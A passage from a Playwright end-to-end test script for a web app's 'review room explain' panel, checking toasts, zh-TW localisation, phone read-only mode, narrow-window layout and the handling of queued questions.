  X = { ...X, running: 9, runs: [...X.runs, run(9, "generate", "running")] }; await p.evaluate(() => window.crewRoomExplain.load(S.route.arg)); await p.waitForSelector("[data-explain-progress]");
  await p.evaluate(() => { location.hash = "#/board"; }); await p.waitForFunction(() => S.route?.name === "board");
  X = { ...X, running: null, runs: [...X.runs.slice(0, -1), run(9, "generate", "done", { version: 4 })] };
  await p.evaluate((id) => window.crewRoomExplain.load(id), ID); await p.waitForSelector("[data-explain-toast]", { timeout: 5000 });
  ok(/walkthrough: v4 is ready/.test(await p.$eval("[data-explain-toast]", (e) => e.textContent)) && (await p.$eval("[data-explain-toast] a", (e) => e.getAttribute("href"))) === `#/room/${ID}`, "a run that ends off the room is announced, with a link back");
  ok(await p.$eval("[data-explain-toast] a", (a) => getComputedStyle(a).color === getComputedStyle(a.closest(".toast")).color), "the toast's link reads in the toast's own colour");
  await p.goto(`${base}/#/room/${ID}`); await p.waitForSelector("[data-explain-room]");

  // ---------- back to the tutor: the board as before ----------
  onSelect = (r) => { X = { ...X, selected: null }; answer(r, X); };
  await p.click("[data-explain-tutor]"); await p.waitForSelector("[data-board]"); await p.waitForTimeout(100);
  ok(posts.at(-1)[0] === "select" && posts.at(-1)[1].skill === null && (await p.$eval("[data-explain-picker]", (e) => e.dataset.explainPicker)) === "tutor" && (await p.$eval("[data-x-layer]", (e) => e.hidden)), "picking the tutor again brings the board back; the output's layer is gone");
  await ctx.close();

  // ---------- zh-TW at 390 on a paired phone: the reason in Chinese; the phone reads only ----------
  { const c2 = await browser.newContext({ viewport: { width: 390, height: 844 } });
    await c2.addInitScript(() => { try { localStorage.setItem("crew.lang", "zh-TW"); localStorage.setItem("crew.onboarding.journey.dismissed.v1", "1"); } catch {}
      Object.defineProperty(window, "speechSynthesis", { configurable: true, value: { getVoices: () => [], speak() {}, cancel() {} } }); window.SpeechRecognition = class { static async available() { return "unavailable"; } }; });
    await c2.route(/^https?:\/\/(?!127\.0\.0\.1)/, (r) => r.abort());
    const Z = { ...X, selected: { id: "walkthrough", v: 1 }, versions: [], running: null, runs: [run(1, "generate", "stopped", { stop: "the safety limit of 120 min passed", why: "limit" })] };
    await c2.route(new RegExp(`/api/review-room/${ID}(\\?open=1)?$`), (r) => r.fulfill({ json: ROOM }));
    await c2.route(new RegExp(`/api/review-room/${ID}/arrive$`), (r) => r.fulfill({ json: {} }));
    await c2.route(new RegExp(`/api/review-room/${ID}/explain$`), (r) => r.fulfill({ json: Z }));
    const q = await c2.newPage(); q.on("pageerror", (e) => errors.push(e.message));
    await q.goto(`${base}/#/room/${ID}`); await q.waitForSelector("[data-explain-empty]", { timeout: 15000 });
    const zt = await q.$eval("[data-explain-empty]", (e) => e.textContent);
    ok(/安全時限/.test(zt) && !/safety limit/.test(zt), "zh-TW: why it stopped is said in Chinese (from the server's reason code)", zt);
    const pick = await q.$eval("[data-explain-picker]", (e) => getComputedStyle(e).display).catch(() => "none");
    ok(pick === "none", "at 390 the picker is not shown (no clipped label)", pick);
    await q.evaluate(() => { window.crewRemote.token = () => "phone"; render(); }); await q.waitForSelector("[data-explain-readonly]");
    ok(!(await q.$("[data-explain-q]")) && !(await q.$("[data-explain-again]")) && /在 Mac 上/.test(await q.$eval("[data-explain-readonly]", (e) => e.textContent)), "a paired phone reads only: no ask box, no Generate, a note says to use the Mac");
    await q.screenshot({ path: join(shots, "7-phone-zh.png") });
    await c2.close(); }

  // ---------- narrow windows (a phone-sized browser, a split-screen Mac): the chat keeps room, its confirmation is clickable ----------
  for (const width of [390, 900]) {
    const c3 = await browser.newContext({ viewport: { width, height: width < 600 ? 844 : 800 } });
    await c3.addInitScript(() => { try { localStorage.setItem("crew.lang", "en"); localStorage.setItem("crew.onboarding.journey.dismissed.v1", "1"); } catch {}
      Object.defineProperty(window, "speechSynthesis", { configurable: true, value: { getVoices: () => [], speak() {}, cancel() {} } }); window.SpeechRecognition = class { static async available() { return "unavailable"; } }; });
    await c3.route(/^https?:\/\/(?!127\.0\.0\.1)/, (r) => r.abort());
    let N = { ...X, selected: { id: "walkthrough", v: 1 }, versions: versions.slice(0, 1), running: null, consent: null, runs: [run(1, "generate", "done", { version: 1 })] };
    await c3.route(new RegExp(`/api/review-room/${ID}(\\?open=1)?$`), (r) => r.fulfill({ json: ROOM }));
    await c3.route(new RegExp(`/api/review-room/${ID}/arrive$`), (r) => r.fulfill({ json: {} }));
    await c3.route(new RegExp(`/api/review-room/${ID}/explain$`), (r) => r.fulfill({ json: N }));
    await c3.route(new RegExp(`/api/review-room/${ID}/explain/ask$`), (r) => r.fulfill({ status: 409, json: { error: "confirm", code: "confirm_required", offer: ASK_OFFER } }));
    await c3.route(new RegExp(`/api/review-room/${ID}/explain/stop$`), (r) => { N = { ...N, running: null, runs: [...N.runs.slice(0, -1), run(2, "generate", "stopped", { why: "captain" })] }; r.fulfill({ json: N }); });
    const w = await c3.newPage(); w.on("pageerror", (e) => errors.push(e.message));
    await w.goto(`${base}/#/room/${ID}`); await w.waitForSelector("[data-explain-q]", { timeout: 15000 });
    await w.fill("[data-explain-q]", "Why?"); await w.click("[data-explain-send]"); await w.waitForSelector("[data-explain-askok]");
    const hit = async (sel) => w.$eval(sel, (e) => { e.scrollIntoView({ block: "center" }); const b = e.getBoundingClientRect(), at = document.elementFromPoint(b.left + b.width / 2, b.top + b.height / 2); return { h: Math.round(b.height), top: Math.round(b.top), at: at ? at.tagName + "." + at.className + (at.dataset ? JSON.stringify(Object.keys(at.dataset)) : "") : null, ok: !!at && (at === e || e.contains(at)) }; });
    const ok1 = await hit("[data-explain-askok]"), ok2 = await hit("[data-explain-consent]"), list = await w.$eval("[data-x-msgs]", (e) => Math.round(e.getBoundingClientRect().height));
    ok(ok1.ok && ok2.ok && list >= 120, `at ${width} wide the chat's messages have room (${list}px) and its Confirm and ask and consent are clickable`, JSON.stringify({ ok1, ok2, list }));
    await w.click("[data-explain-consent]"); ok(await w.$eval("[data-explain-consent]", (e) => e.checked), `at ${width} wide the consent box takes the click`);
    await w.screenshot({ path: join(shots, `8-narrow-${width}.png`), fullPage: true });
    if (width === 900) {
      // a question queued during a generation that then stops goes back into the ask box
      N = { ...N, versions: [], running: 2, runs: [...N.runs, run(2, "generate", "running")] }; await w.evaluate(() => window.crewRoomExplain.load(S.route.arg)); await w.waitForSelector("[data-explain-progress]");
      await w.fill("[data-explain-q]", "What is the gist?"); await w.click("[data-explain-send]"); await w.waitForSelector("[data-explain-queued]");
      await w.click("[data-explain-progress] [data-explain-stop]"); await w.waitForSelector("[data-explain-empty]"); await w.waitForTimeout(150);
      ok(!(await w.$("[data-explain-queued]")) && (await w.$eval("[data-explain-q]", (e) => e.value)) === "What is the gist?", "a question waiting for a generation that stopped goes back into the ask box, not left waiting");
      // a question waiting for a generation that finishes while the captain is away is asked when they come back
      N = { ...N, running: 3, runs: [...N.runs, run(3, "generate", "running")] }; await w.evaluate(() => window.crewRoomExplain.load(S.route.arg)); await w.waitForSelector("[data-explain-progress]");
      await w.fill("[data-explain-q]", "And the risk?"); await w.click("[data-explain-send]"); await w.waitForSelector("[data-explain-queued]");
      const asked = []; await w.route(new RegExp(`/api/review-room/${ID}/explain/ask$`), (r) => { asked.push(JSON.parse(r.request().postData() || "{}")); r.fulfill({ status: 409, json: { error: "confirm", code: "confirm_required", offer: ASK_OFFER } }); });
      await w.evaluate(() => { location.hash = "#/board"; }); await w.waitForFunction(() => S.route?.name === "board");
      N = { ...N, running: null, versions: versions.slice(0, 1), runs: [...N.runs.slice(0, -1), run(3, "generate", "done", { version: 1 })] };
      await w.evaluate((id) => { location.hash = `#/room/${id}`; }, ID); await w.waitForSelector("[data-explain-askconfirm]", { timeout: 8000 });
      ok(asked.length === 1 && asked[0].question === "And the risk?" && !asked[0].confirm, "a question waiting for a run that finished while away is asked on coming back, behind its confirmation", JSON.stringify(asked));
    }
    await c3.close();
  }
  ok(!errors.length, "no page error", errors.join(" | "));
} catch (e) { fail++; console.log("  FAIL  the run stopped:", e?.stack || e); console.log(appLog.slice(-3000)); }
finally { await browser.close(); app.kill(); probe.close(); }
console.log(`\nreview-room-explain-ui: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
